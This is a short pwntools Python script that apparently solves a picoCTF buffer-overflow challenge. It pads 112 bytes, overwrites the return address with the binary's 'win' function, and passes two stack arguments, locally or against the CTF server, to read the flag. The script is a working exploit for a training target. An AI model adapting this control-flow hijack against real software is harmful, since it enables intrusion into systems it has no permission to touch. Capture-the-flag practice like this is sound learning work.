#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe

ARG1 = 0xCAFEF00D
ARG2 = 0xF00DF00D
PADDING = b'A' * 112        # cyclic -n 4 --lookup 0x62616164


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, '''
                break *vuln
                ''')
    else:
        r = remote("saturn.picoctf.net", 51085)

    return r


def main():
    r = conn()
    win = exe.symbols['win']

    # PLUS: Added a return address for the 'win' function just to remind the order of each piece in the payload
    payload = PADDING + p32(win) + p32(exe.symbols['main'] + 115) + p32(ARG1) + p32(ARG2)
    r.sendlineafter(b'Please enter your string: \n', payload)

    sleep(1)

    flag = r.recv(0x100).split(b'\n')[-1]
    # log.warn(f'Junk obtained: {junk}')
    log.warn(f'Flag obtained: {flag}')


if __name__ == "__main__":
    main()
